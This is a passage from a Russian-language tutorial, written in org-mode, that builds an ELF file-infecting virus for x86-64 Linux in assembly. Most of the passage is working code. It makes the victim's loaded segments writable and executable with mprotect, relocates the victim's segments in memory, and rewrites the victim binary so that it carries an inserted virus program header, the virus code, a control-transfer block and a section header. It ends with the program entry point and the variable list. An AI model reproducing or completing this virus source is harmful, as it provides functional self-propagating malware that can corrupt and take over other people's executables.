      mov     offset_to_e_entry_frm_file_begin(%rip), %rdi
      test    %rdi, %rdi
      je      _count_begin_elf_addr_in_memory_fail

      // грузим адрес _start - это будет
      // актульаный e_entry
      leaq    _start(%rip), %rax

      sub     %rsi, %rax
      sub     %rdi, %rax

      mov     %rax, victim_elf_addr(%rip)

  _count_begin_elf_addr_in_memory_success:
      xor     %rax, %rax
      jmp    _count_begin_elf_addr_in_memory_exit

  _count_begin_elf_addr_in_memory_fail:
      mov     $-1, %rax

  _count_begin_elf_addr_in_memory_exit:
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Теперь когда начальный адрес эльфа получен, можно вызвать уже известную
нам ~_get_phdrs_info~, чей код описан выше, и получить всю информацию о
заголовках сегментов.

Что позволяет нам вызвать ~mprotect~ для каждого из них, но с небольшой
оговоркой.
Дело в том, что в заголовках сегментов указаны виртульные адреса
сегментов, а не реальные. То есть мы понятия не имеем, где сегменты
находятся на самом деле.
Но в этом случае виртуальные адреса сегментов и виртуальный адрес первого
сегмента, который мы предсумотрительно сохралили в блоке данных, позволят
нам узнать смещение сегмента от начала файла ~в памяти~.

Предположим, у первого загружаемого сегмента адрес ~0x400000~, а у другого
сегмента - ~0x600000~. То есть мы видим, что второй сегмент находится
дальше от самого первого на ~0x200000~ байт. Это знание вкупе с базовым
адресом эльфа в памяти процесса позволяет получить нам реальный адрес
сегмента.

И вот тогда можно вызвать для него ~mprotect~.

Запишем эту идею в коде.
Данная функция высчитывает адрес сегмента и его размер, и записывает эти
значения в переменные.

#+NAME:  _get_segm_addr_and_sz
#+BEGIN_SRC asm
  /// _GET_SEGM_ADDR_AND_SZ
  /// считает адрес, по которому начинается
  /// сегмент в памяти, адрес, по которму заканчивается
  /// и размер сегмента
  _get_segm_addr_and_sz:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8

      // проверяем необходимые данные
      mov     cur_seg_hdr_ptr(%rip), %rax
      test    %rax, %rax
      je      _get_segm_addr_and_sz_fail

      mov     victim_elf_addr(%rip), %rbx
      test    %rbx, %rbx
      je      _get_segm_addr_and_sz_fail

      // считаем
      mov     first_seg_vaddr(%rip), %rcx

      mov     PHDR_P_VADDR(%rax), %rbx
      sub     %rcx, %rbx

      // размер сегмента
      mov     PHDR_P_MEMSZ(%rax), %rcx
      mov     %rcx, cur_seg_memsz(%rip)

      // адрес начала сегмента
      mov     victim_elf_addr(%rip), %r8
      add     %r8, %rbx
      mov     %rbx, cur_seg_addr(%rip)

      // адрес конца сегмента
      add     %rcx, %rbx
      mov     %rbx, cur_seg_end_addr(%rip)

  _get_segm_addr_and_sz_success:
      xor     %rax, %rax
      jmp     _get_segm_addr_and_sz_exit

  _get_segm_addr_and_sz_fail:
      mov     $-1, %rax

  _get_segm_addr_and_sz_exit:
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx

      ret

#+END_SRC

А теперь напишем функцию ~_mprotect_in_loop~, которая пройдется циклом по
таблице заголовков сегментов, найдет среди них загружаемые сегменты,
вызовет ~_get_segm_addr_and_sz~, которая посчитает реальный адрес
сегмента в памяти, а затем  вызовет ~mprotect~ для каждого из них.

#+NAME: _mprotect_in_loop
#+BEGIN_SRC asm
  /// _MPROTECT_IN_LOOP
  /// Разрешает самомодификацию жертве
  /// Проходится по заголовкам сегментов,
  /// находит сгменты типа LOAD, читает
  /// их виртуальные адреса, пересчитывает в физические
  /// вызывает mprotect для каждого сегмента LOAD
  _mprotect_in_loop:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8
      push    %rdi
      push    %rsi

      mov     victim_phdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _mprotect_cycle_fail

      mov     victim_phdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _mprotect_cycle_fail

  _mprotect_cycle:
      // загружаемвый сегмент?
      cmp     $0x1, (%rdi)
      jne     _mprotect_cycle_next

      // высчитать его адрес и в памяти
      // и вызвать для него mprotect
      mov     %rdi, cur_seg_hdr_ptr(%rip)
      call    _get_segm_addr_and_sz
      test    %rax, %rax
      jne     _mprotect_cycle_fail

      // syscall меняет rcx
      mov     %rcx, %r8
      mov     %rdi, %rbx

      mov     cur_seg_addr(%rip), %rdi
      mov     cur_seg_end_addr(%rip), %rsi

      and     $~0xFFF, %rdi  # выровненный адрес
      sub     %rdi, %rsi  # размер памяти

      mov     $0x7, %rdx   # RW+EXEC flags - $RDX
      mov     $0xA, %rax   # mprotect handle
      syscall

      test    %rax, %rax
      jne     _mprotect_cycle_fail

      mov     %r8, %rcx
      mov     %rbx, %rdi

  _mprotect_cycle_next:
      add     $0x38, %rdi
      loop    _mprotect_cycle

  _mprotect_cycle_success:
      xor     %rax, %rax
      jmp     _mprotect_cycle_exit

  _mprotect_cycle_fail:
      mov     $-1, %rax

  _mprotect_cycle_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

После этого можно отредактировать секцию ~dynamic~, используя уже
известную нам ~_recount_dynamic_section~.

А после этого мы сдвигем каждый загружаемый сегмент, уделив особое
внимание первому сегменту и секции ~dynamic~. Что делае с секцией
~dynamic~ уже жоговорились - не двигаем и частично затираем.
А что с первым сегментом-то не так?

Если помните, первый загружаемый сегмент - это
единственный сегмент, чем виртуальный адрес и смещение не были
отредактированы, поскольку начало первого загружаемого сегмента и начало
эльф-файла - это одно и то же и первый сегмент включает в себя заголовок
эльфа и таблицу заголовков сегментов. То есть его вставка заголовка
вируса никак не влияет на его расположение, только на размер.

Поэтому когда мы натыкаемся на первый сегмент - а у него будет нулевое
смещение от начала файла - мы высчитываем, где заканчивается таблица
заголовков сегментов, и двигаем код, расположенный после нее.

Все прочие загружаемые сегменты мы двигаем сначала.

#+NAME: move_segments
#+BEGIN_SRC asm
  /// _MOVE_SEGMENTS
  /// Сдвигает жертву в памяти процесса таким
  /// образом, как будто никакого заражения не
  /// было
  _move_segments:
      push    %rcx
      push    %rbx
      push    %rdx
      push    %rdi

      mov     victim_phdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je     _move_segments_fail

      mov     victim_phdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _move_segments_fail

  _move_segments_cycle:
      // загружаемвый сегмент?
      cmp     $0x1, (%rdi)
      jne     _move_segments_next

      // это первый загружаемый сегмент кода?
      mov     PHDR_P_OFFSET(%rdi), %rax
      test    %rax, %rax

      je      _move_first_segment

  _move_segment:
      mov     %rdi, cur_seg_hdr_ptr(%rip)
      call    _get_segm_addr_and_sz
      test    %rax, %rax
      jne     _move_segments_fail

      call    _my_memcpy
      test    %rax, %rax
      jne     _move_segments_fail

  _move_segments_next:
      add     $0x38, %rdi
      loop    _move_segments_cycle
      jmp     _move_segments_success

      // сдвигаем первый сегмент кода
      // он включает в себя заголовок эльфа и
      // таблицу заголовков сегментов, которые
      // сдвигать не надо - нам надо сдвинуть только
      // код жертвы, который начинается сразу после
      // таблицы заголовков
  _move_first_segment:
      mov     %rdi, cur_seg_hdr_ptr(%rip)
      call    _get_segm_addr_and_sz
      test    %rax, %rax
      jne     _move_segments_fail

      mov     cur_seg_addr(%rip), %rax
      mov     cur_seg_memsz(%rip), %rbx

      mov     victim_code_offset(%rip), %rdx
      sub     %rdx, %rbx  # размер сдвигаемого сегмента
      mov     %rbx, cur_seg_memsz(%rip)
      add     %rdx, %rax
      mov     %rax, cur_seg_addr(%rip)

      call    _my_memcpy
      test    %rax, %rax
      jne     _move_segments_fail

      jmp     _move_segments_next

  _move_segments_success:
      xor     %rax, %rax
      jmp     _move_segments_exit

  _move_segments_fail:
      mov    $-1, %rax

  _move_segments_exit:
      pop    %rdi
      pop    %rdx
      pop    %rbx
      pop    %rcx
      ret

#+END_SRC

Наверняка вы заметили в коде ~move_segments~  вызов функции
~_my_memcpy~. Она действительно похожа на библиотечную ~memcpy~, но с
оговоркой, что наша ~memcpy~ отслеживает, где расположен код, который она
копирует: до секции ~dynamic~ или после.

Для этого надо высчитать адрес ~dynamic~ в памяти.
Делаем мы это так же, как высчитывали реальные адреса сегментов.
#+NAME: _count_dynamic_addr
#+BEGIN_SRC asm
  /// _COUNT_DYNAMIC_ADDR
  /// Считает адрес секции dynamic в памяти
  _count_dynamic_addr:
      push    %rbx

      mov     dynamic_records_vaddr(%rip), %rax
      test    %rax, %rax
      je      _count_dynamic_addr_fail

      mov     first_seg_vaddr(%rip), %rbx
      sub     %rbx, %rax

      mov     victim_elf_addr(%rip), %rbx
      test    %rbx, %rbx
      je      _count_dynamic_addr_fail

      add     %rax, %rbx
      mov     %rbx, dynamic_records_addr(%rip)

  _count_dynamic_addr_success:
      xor     %rax, %rax
      jmp     _count_dynamic_addr_exit

  _count_dynamic_addr_fail:
      mov     $-1, %rax

  _count_dynamic_addr_exit:
      pop     %rbx
      ret

#+END_SRC

Помните, мы договорились не двигать секцию ~dynamic~? Именно ~_my_memcpy~
это осуществляет.
В цикле ~_cycle_my_memcpy_before_dynamic~ она постоянно сравнивает адрес
источника с адресом секции ~dynamic~ в памяти.

Как только она видит, что эти адреса совпали, она увеличивает источник и
приемник на размер секции ~dynamic~ - так мы пропускаем ее без
перемещения. Затем она вычитает содержимое
~new_bind_now_flag_record_size~ из приемника. Это позволяет нам затереть
запись ~BIND_NOW~ если она была. После чего мы уменьшаем счетчик цикла на
размер ~dynamic~ и переходим в цикл ~_cycle_my_memcpy_after_dynamic~, где
уже никакие проверки не выполняются, а просто переписывается байт за
байтом из источника в приемник.

#+NAME: _my_memcpy
#+BEGIN_SRC asm
  /// _MY_MEMCPY
  /// Переписывает код с одного адреса
  /// в другой
  _my_memcpy:
      pushq    %rcx
      pushq    %rdx
      pushq    %rdi
      pushq    %rsi

      mov     cur_seg_memsz(%rip), %rcx
      test    %rcx, %rcx
      je      _my_memcpy_fail

      mov     cur_seg_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _my_memcpy_fail

      mov     %rsi, %rdi
      sub     $0x38, %rdi

      mov     dynamic_records_addr(%rip), %rax

  _cycle_my_memcpy_before_dynamic:

      // этот цикл работает, пока мы
      // перемещаем все до секции dynamic
      movb    (%rsi), %dl
      cmp     %rax, %rsi
      // как только мы на нее наткнулись
      // пропускаем ее
      je      _scip_dynamic
      movb    %dl, (%rdi)

      inc     %rsi
      inc     %rdi

      loop    _cycle_my_memcpy_before_dynamic
      jmp     _my_memcpy_success

      // пропускаем секцию dynamic -
      // не редактируем ее
  _scip_dynamic:
      mov     dynamic_records_size(%rip), %rdx

      // сдвинуть указатели на конец
      // секции dynamic
      add     %rdx, %rdi
      add     %rdx, %rsi

      // уменьшить количество итераций
      sub     %rdx, %rcx

      // сдвинуть dest так, чтоб
      // запись BIND_NOW, если она есть
      // была затерта
      mov     new_bind_now_flag_record_size(%rip), %rdx
      sub     %rdx, %rdi

      // этот цикл начнется, если мы окажемся
      // после секции dynamic
  _cycle_my_memcpy_after_dynamic:
      movb    (%rsi), %dl
      movb    %dl, (%rdi)

      inc     %rsi
      inc     %rdi

      dec     %rcx
      test    %rcx, %rcx
      je      _my_memcpy_success
      jmp     _cycle_my_memcpy_after_dynamic

  _my_memcpy_success:
      xor     %rax, %rax
      jmp     _my_memcpy_exit

  _my_memcpy_fail:
      mov     $-1, %rax

  _my_memcpy_exit:
      popq    %rsi
      popq    %rdi
      popq    %rdx
      popq    %rcx
      ret

#+END_SRC

Теперь соберем все это в единый алгоритм ~move_victim~.
Он заработает только, когда вирус будет исполняться из инфицированной
жертвы.

Обратите внимание, что в случае провала, он прыгает на выход из вируса.
#+NAME: move_victim
#+BEGIN_SRC asm
  /// _MOVE_VICTIM
  /// Сдвигает жертву на ее прежние адреса
  _move_victim:
      call    _get_move_victim_data
      test    %rax, %rax
      jne     _move_victim_fail

      call    _count_begin_elf_addr_in_memory
      test    %rax, %rax
      jne     _move_victim_fail

      call    _get_phdrs_info
      test    %rax, %rax
      jne     _move_victim_fail

      call    _mprotect_in_loop
      test    %rax, %rax
      jne     _move_victim_fail

      call   _count_dynamic_addr
      test    %rax, %rax
      jne     _move

      call    _recount_dynamic_section

  _move:
      call    _move_segments
      test    %rax, %rax
      jne     _move_victim_fail

  _move_victim_success:
      ret

  _move_victim_fail:
      jmp     _exit_virus

#+END_SRC

*** Перезапись эльфа
Теперь, когда у нас есть весь необхлодимый код, надо пересобрать файл
жертвы, заразив его.

При перезаписи мы используем ~pwite~, который записывает код в файл по
заданному смещению. Смещение высчитывается просто: поскольку мы знаем
размеры кусков кода, которые вписываем, то при записи нового куска, мы
прибавляем его размер к смещению и таким образом получаем новое смещение
в файле.

Есть на этом этапе один костыль. Почему-то при заражении и дальнейшей
перезаписи эльф-файла формата ~DYN~ текстовая секция заполняется нулями
при том, что до записи она не повреждена - т.е. по указателю, с которого
ведется запис в файл, действительно лежит секция ~text~. При этом данный
баг исчезает, если сначала все записать в промежутоный файл, а затем уже
из него перезаписать в заражаемый эльф.

Поэтому сначала напишем функцию ~_rewrite_to_victim_file~, которая
осуществляет запись из промежуточного файла в тот, который мы хотели
заразить изначально.

~_rewrite_to_victim_file~ сначала закрывает промежуточный файл - потому
что иначе в нем ничего не сохранится - затем сохраняет файловый
дескриптор открытой жертвы, мапит промежуточный файл в память, а затем
одним вызовом переписывает все из него в файл-жертву.

#+NAME: _rewrite_to_victim_file
#+BEGIN_SRC asm
  /// _REWRITE_TO_VICTIM_FILE
  /// Переписывает весь код из промежуточного файла
  /// в файл жертвы
  _rewrite_to_victim_file:
      push    %rdi
      push    %rsi
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      test    %rdi, %rdi
      je      _rewrite_to_victim_file_fail

      mov     $0x3, %rax      # syscall close
      syscall
      // созранили fd жертвы
      mov     fd(%rip), %rbx

      lea     new_elf_file(%rip), %rdi
      mov     $O_RDWR, %rsi
      call    _openfile
      cmp     $0x0, %rax
      jl     _rewrite_to_victim_file_fail

      mov     %rbx, %rdi
      mov     %rax, %rsi
      xor     %rcx, %rcx
      xor     %r10, %r10
      mov     file_sz(%rip), %rdx

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _rewrite_to_victim_file_fail

  _rewrite_to_victim_file_success:
      xor     %rax, %rax
      jmp     _rewrite_to_victim_file_exit

  _rewrite_to_victim_file_fail:
      mov     $-1, %rax

  _rewrite_to_victim_file_exit:
      pop     %r10
      pop     %rdx
      pop     %rcx
      pop     %rbx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Теперь же покажу саму запись в файл. Как я говорил раньше, в ней нет
ничего особенного: просто берем указатель, берем размер кода, который
собираемся писать, смещение, и пишем в файл.

Снчала запишем код от начала жертвы до конца ее таблицы заголовков сегментов.
#+NAME: _write_till_phdr_table_end
#+BEGIN_SRC asm
  /// _WRITE_TILL_PHDR_TABLE_END
  /// Вписывает в файл жертву от ее начала до
  /// конца таблицы заголовков сегментов
  _write_till_phdr_table_end:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      mov     victim_elf_addr(%rip), %rsi
      mov     victim_phdr_table_size(%rip), %rdx
      add     $0x40, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_till_phdr_table_end_fail

  _write_till_phdr_table_end_success:
      xor     %rax, %rax
      jmp     _write_till_phdr_table_end_exit

  _write_till_phdr_table_end_fail:
      mov     $-1, %rax

  _write_till_phdr_table_end_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Затем вписываем заголовок вируса.

#+NAME: _write_new_phdr_virus
#+BEGIN_SRC asm
  /// _WRITE_NEW_PHDR_VIRUS
  /// Вписывает новый заголовок в жертву
  _write_new_phdr_virus:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    virus_new_phdr(%rip), %rsi
      mov     $0x38, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_new_phdr_virus_fail

  _write_new_phdr_virus_success:
      xor     %rax, %rax
      jmp     _write_new_phdr_virus_exit

  _write_new_phdr_virus_fail:
      mov     $-1, %rax

  _write_new_phdr_virus_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Затем у нас есть два варианта: если мы не добавляли запись ~BIND_NOW~, то
весь код жертвы можно вписать в файл одним вызовом.

#+NAME: _write_whole_victim
#+BEGIN_SRC asm
  /// _WRITE_WHOLE_VICTIM
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_whole_victim:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     new_bind_now_flag_record_size(%rip), %rdi
      test    %rdi, %rdi
      jne     _write_whole_victim_fail

      mov     interm_fd_file(%rip), %rdi
      mov     victim_code_addr(%rip), %rsi
      mov     victim_code_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_whole_victim_fail

  _write_whole_victim_success:
      xor     %rax, %rax
      jmp     _write_whole_victim_exit

  _write_whole_victim_fail:
      mov     $-1, %rax

  _write_whole_victim_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Если же мы вставляли ~BIND_NOW~, то сначала мы вписываем весь код до
места вставки, потом вписываем запись, а потом оставшуюся часть кода
жертвы.

#+NAME: _write_victim_code_with_bind_now
#+BEGIN_SRC asm
  /// _WRITE_VICTIM_CODE_WITH_BIMD_NOW
  /// Вписывает жертву с записью BIND_NOW
  _write_victim_code_with_bind_now:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     new_bind_now_flag_record_size(%rip), %rdi
      test    %rdi, %rdi
      je      _write_victim_code_with_bind_now_fail

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      mov     victim_code_before_bind_now_addr(%rip), %rsi
      mov     victim_code_before_bind_now_size(%rip), %rdx

      add     %rdx, %r8
      mov     interm_fd_file(%rip), %rdi
      mov     $0x12, %rax
      syscall

      test   %rax, %rax
      je     _write_victim_code_with_bind_now_fail

      // вписываем запись BIND_NOW
      mov     %r8, %rcx
      mov     %rcx, %r10

      leaq    bind_now_flag_record(%rip), %rsi
      mov     new_bind_now_flag_record_size(%rip), %rdx

      add     %rdx, %r8

      mov     interm_fd_file(%rip), %rdi
      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_victim_code_with_bind_now_fail

      // вписываем жертву от точки, куда вставили
      // запись BIND_NOW, до конца
      mov     %r8, %rcx
      mov     %rcx, %r10

      mov     victim_code_after_bind_now_addr(%rip), %rsi
      mov     victim_code_after_bind_now_size(%rip), %rdx

      add     %rdx, %r8

      mov     interm_fd_file(%rip), %rdi
      mov     $0x12, %rax   # syscall pwrite
      syscall

      mov    %r8, file_offset(%rip) # 0x401918
      test   %rax, %rax
      je     _write_victim_code_with_bind_now_fail

  _write_victim_code_with_bind_now_success:
      xor    %rax, %rax
      jmp     _write_victim_code_with_bind_now_exit

  _write_victim_code_with_bind_now_fail:
      mov     $-1, %rax

  _write_victim_code_with_bind_now_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC


Тепрь вписываем код вируса.
Напоминаю, что когда мы высчитывали размер этого кода, мы прибавили к
нему размер блока передачи управления на жертву. Но сейчас мы вписываем
только сам код вируса. Поэтому надо уменьшить его размер на размер блока
передачи управления.

#+NAME: _write_virus_code
#+BEGIN_SRC asm
  /// _WRITE_WHOLE_VICTIM
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_virus_code:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      mov     virus_code_addr(%rip), %rsi
      mov     virus_code_size(%rip), %rdx

      mov     transfer_control_code_size(%rip), %rax
      sub     %rax, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_virus_code_fail

  _write_virus_code_success:
      xor     %rax, %rax
      jmp     _write_virus_code_exit

  _write_virus_code_fail:
      mov     $-1, %rax

  _write_virus_code_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Вписываем блок передачи управления.

#+NAME:
#+BEGIN_SRC asm
  /// _WRITE_TRANSFER_CONTROL_CODE_BLOCK
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_transfer_control_code_block:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    transfer_control_code(%rip), %rsi
      mov     transfer_control_code_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_transfer_control_code_block_fail

  _write_transfer_control_code_block_success:
      xor     %rax, %rax
      jmp     _write_transfer_control_code_block_exit

  _write_transfer_control_code_block_fail:
      mov     $-1, %rax

  _write_transfer_control_code_block_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

За ним вписываем блок данных жертвы.
#+NAME: _write_data_block
#+BEGIN_SRC asm
  /// _WRITE_DATA_BLOCK
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_data_block:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    data_block(%rip), %rsi
      mov     data_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_data_block_fail

  _write_data_block_success:
      xor     %rax, %rax
      jmp     _write_data_block_exit

  _write_data_block_fail:
      mov     $-1, %rax

  _write_data_block_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Теперь, наконец, можно вписать заголовки секций жертвы.

#+NAME: _write_victim_shdrs
#+BEGIN_SRC asm
  /// _WRITE_VICTIM_SHDRS
  ///  Пишет таблицу заголовков секций
  _write_victim_shdrs:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      mov     victim_shdr_table_addr(%rip), %rsi
      mov     victim_shdr_table_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_data_block_fail

  _write_victim_shdrs_success:
      xor     %rax, %rax
      jmp     _write_victim_shdrs_exit

  _write_victim_shdrs_fail:
      mov     $-1, %rax

  _write_victim_shdrs_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

И последнее, что мы впишем в файл, будет заголовок секции вируса.

#+NAME: _write_virus_new_shdr
#+BEGIN_SRC asm
  /// _WRITE_VICTIM_SHDRS
  ///  Пишет таблицу заголовков секций
  _write_virus_new_shdr:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    virus_new_shdr(%rip), %rsi
      mov     $0x40, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_virus_new_shdr_fail

  _write_virus_new_shdr_success:
      xor     %rax, %rax
      jmp     _write_virus_new_shdr_exit

  _write_virus_new_shdr_fail:
      mov     $-1, %rax

  _write_virus_new_shdr_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Ну и соберем весь алгорим вместе.
#+NAME: _recombine_elf
#+BEGIN_SRC asm
  /// _RECOMBINE_ELF_WITHOUT_NEW_BIND_NOW
  /// Перекомпоновывает эльф
  _recombine_elf:
      push    %rdi
      push    %rsi
      push    %rdx

      // промежуточный файл открыт?
      mov     interm_fd_file(%rip), %rdi
      // mov     fd(%rip), %rdi
      // mov     %rdi, interm_fd_file(%rip)

      test    %rdi, %rdi
      je      _recombine_elf_fail

      // этапы парсинга жертвы, получения данных вируса
      // и пересчитывания жертвы прошли успешно?
      mov     parse_success(%rip), %rdx
      test    %rdx, %rdx
      jne      _recombine_elf_fail

      mov     recount_success(%rip), %rdx
      test    %rdx, %rdx
      jne      _recombine_elf_fail

      mov     get_virus_success(%rip), %rdx
      test    %rdx, %rdx
      jne      _recombine_elf_fail

      // тогда переколбашиваем эльф
  _recombine_cur_elf:
      call    _write_till_phdr_table_end
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_new_phdr_virus
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_whole_victim
      test    %rax, %rax
      je      _write_end_of_file

      call    _write_victim_code_with_bind_now
      test    %rax, %rax
      jne     _recombine_elf_fail

  _write_end_of_file:
      call    _write_virus_code
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_transfer_control_code_block
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_data_block
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_victim_shdrs
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_virus_new_shdr
      test    %rax, %rax
      jne     _recombine_elf_fail

  _recombine_elf_success:
      xor     %rax, %rax
      jmp     _recombine_elf_exit

  _recombine_elf_fail:
      mov     $-1, %rax

  _recombine_elf_exit:
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Сборка вируса

Ура, мы полностью разобрались в том, как работает вирус. Теперь осталось
все это соединить.

Программа начинается со старта, так что напием его. Задача старта -
перекинуть управление на start_infector. Просто нам нужно, чтоб весь код,
включая переменные, оказался между стартом и ~global_exit~, чтоб
разрешить ему самомодификацию.

#+NAME: _start
#+BEGIN_SRC asm
      .text 0

      .global	_start
      .type	_start, @function

  _start:
      leaq    _start_infector(%rip), %rsi
      jmp     *%rsi

#+END_SRC

Теперь впишем переменные и строки, ради которых мы вызывали ~mprotect~
Обратите внимание на переменные ~clear_from~ и ~clear_to~ - эти
переменные указывают функции ~clear_old_data~ с какого по какой адрес мы
все заполняем нулями.

#+NAME: vars
#+BEGIN_SRC asm
  _msg_infection_success:
      .ascii " is successfully infected \n"

  _msg_cur_infection:
      .ascii " file: infection try \n"

  new_elf_file:
      .string "test_inf"

  dir_name:
      .string "./"

  mprotect_ok:
      .quad -1

  parse_success:
      .quad -1

  recount_success:
      .quad -1

  get_virus_success:
      .quad -1

  old_rsp:
      .quad 0     # вершина стека жертвы

  old_rbx:
      .quad 0

  old_rdx:
      .quad 0

  old_rcx:
      .quad 0

  old_rdi:
      .quad 0

  old_rsi:
      .quad 0

  old_r8:
      .quad 0

  old_r9:
      .quad 0

  old_r10:
      .quad 0

  old_r11:
      .quad 0

  old_r12:
      .quad 0

  old_r13:
      .quad 0

  old_r14:
      .quad 0

  old_r15:
      .quad 0

  _stack_top:
      .space 6000, 0

  _stack_bottom:
      .quad 0

  data_size:
      .quad 0x50

  constant_value:
      .quad 0x38

  clear_from:
      .quad 0

  fd:
      .quad 0

  interm_fd_file:
      .quad 0

  file_offset:
      .quad 0

  cur_filename:
      .quad 0

  dir_buf:
      .space 8000, 0

  dir_struct:
      .space 30, 0

  dir_buf_ptr:
      .quad 0

  file_name_ptr:
      .quad 0

  string_length:
      .quad 0

  victim_elf_addr:
      .quad 0

  victim_phdr_table_addr:
      .quad 0

  victim_phdr_table_size:
      .quad 0

  victim_phdr_amount:
      .quad 0

  victim_shdr_table_addr:
      .quad 0

  victim_shdr_table_size:
      .quad 0

  victim_shdr_amount:
      .quad 0

  virus_new_vaddr:
      .quad 0

  virus_new_phdr:
      .space 0x38, 0

  virus_new_shdr:
      .space 0x40, 0

  bind_now_flag_record:
      .space 0x10, 0

  last_seg_vaddr:
      .quad 0

  last_seg_allign:
      .quad 0

  victim_code_size:
      .quad 0

  victim_code_addr:
      .quad 0

  victim_code_frm_begin_vaddr:
      .quad 0

  victim_code_offset:
      .quad 0

  victim_code_before_bind_now_size:
      .quad 0

  victim_code_after_bind_now_size:
      .quad 0

  victim_code_before_bind_now_addr:
      .quad 0

  victim_code_after_bind_now_addr:
      .quad 0

  virus_code_addr:
      .quad 0

  virus_code_size:
      .quad 0

  symtab_shdr_addr:
      .quad 0

  symtab_records_amount:
      .quad 0

  dynamic_records_offset:
      .quad 0

  dynamic_records_size:
      .quad 0

  dynamic_records_vaddr:
      .quad 0

